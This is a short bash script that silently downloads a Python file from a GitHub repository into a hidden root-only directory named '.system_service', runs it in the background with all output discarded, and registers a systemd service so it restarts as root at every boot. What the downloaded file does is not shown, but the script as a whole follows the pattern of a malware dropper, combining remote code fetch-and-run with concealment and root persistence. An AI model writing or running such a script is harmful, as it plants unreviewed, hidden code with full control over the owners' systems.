#!/bin/bash
# -----------------------------
# Auto-run Python script in background at startup
# -----------------------------

# -----------------------------
# Configuration
# -----------------------------
PYTHON_FILE_URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
SECRET_DIR="/root/.system_service"   # Hidden & root-only directory
DEST_FILE="$SECRET_DIR/gd.py"

# -----------------------------
# Ensure secret directory exists
# -----------------------------
if [ ! -d "$SECRET_DIR" ]; then
    mkdir -p "$SECRET_DIR"
    chmod 700 "$SECRET_DIR"  # Only root can access
fi

# -----------------------------
# Download Python script silently
# -----------------------------
curl -s -o "$DEST_FILE" "$PYTHON_FILE_URL"
chmod 700 "$DEST_FILE"  # Make it executable only by root

# -----------------------------
# Run the script in background
# -----------------------------
nohup python3 "$DEST_FILE" >/dev/null 2>&1 &

# -----------------------------
# Ensure script runs on startup
# -----------------------------
AUTOSTART_FILE="/etc/systemd/system/python_auto.service"

if [ ! -f "$AUTOSTART_FILE" ]; then
    cat <<EOL > "$AUTOSTART_FILE"
[Unit]
Description=Auto-run secret Python script
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $DEST_FILE
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOL

    # Reload systemd and enable the service
    systemctl daemon-reload
    systemctl enable python_auto.service
fi
